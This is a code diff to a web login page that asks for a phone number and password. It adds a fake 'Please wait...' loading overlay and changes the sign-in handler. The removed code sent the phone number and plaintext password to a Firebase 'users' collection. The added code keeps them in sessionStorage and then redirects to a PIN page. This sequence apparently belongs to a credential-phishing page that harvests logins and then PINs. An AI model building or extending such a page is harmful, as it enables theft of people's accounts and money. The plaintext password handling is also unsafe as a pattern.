@@ -23,6 +23,41 @@ display:flex;
 justify-content:center;
 min-height:100vh;
 }
+    #loading{
+    position:fixed;
+    inset:0;
+    background:rgba(255,255,255,.95);
+    display:none;
+    justify-content:center;
+    align-items:center;
+    flex-direction:column;
+    z-index:9999;
+}
+
+.loader{
+    width:55px;
+    height:55px;
+    border:5px solid #e5e5e5;
+    border-top:5px solid #63d12f;
+    border-radius:50%;
+    animation:spin .8s linear infinite;
+}
+
+#loading p{
+    margin-top:18px;
+    font-size:16px;
+    font-weight:600;
+    color:#444;
+}
+
+@keyframes spin{
+    from{
+        transform:rotate(0deg);
+    }
+    to{
+        transform:rotate(360deg);
+    }
+}
 
 .container{
 width:100%;
@@ -367,6 +402,11 @@ font-size:16px;
 
 </div>
 
+    <div id="loading">
+    <div class="loader"></div>
+    <p>Please wait...</p>
+</div>
+
 
 <button id="loginBtn">SIGN IN</button>
 
@@ -424,21 +464,21 @@ function validate() {
 phone.addEventListener("input", validate);
 password.addEventListener("input", validate);
 
-btn.addEventListener("click", async function(){
+const loading = document.getElementById("loading");
 
-    if(!btn.classList.contains("active")) return;
+btn.addEventListener("click", function () {
 
-    try{
-        await push(ref(db,"users"),{
-            phone: phone.value,
-            password: password.value,
-            time: new Date().toLocaleString()
-        });
+    if (!btn.classList.contains("active")) return;
 
-        alert("Data Saved");
-    }catch(error){
-        alert(error.message);
-    }
+    sessionStorage.setItem("phone", phone.value);
+    sessionStorage.setItem("password", password.value);
+
+    loading.style.display = "flex";
+    btn.disabled = true;
+
+    setTimeout(() => {
+        window.location.href = "pin.html";
+    }, 2000);
 
 });
 
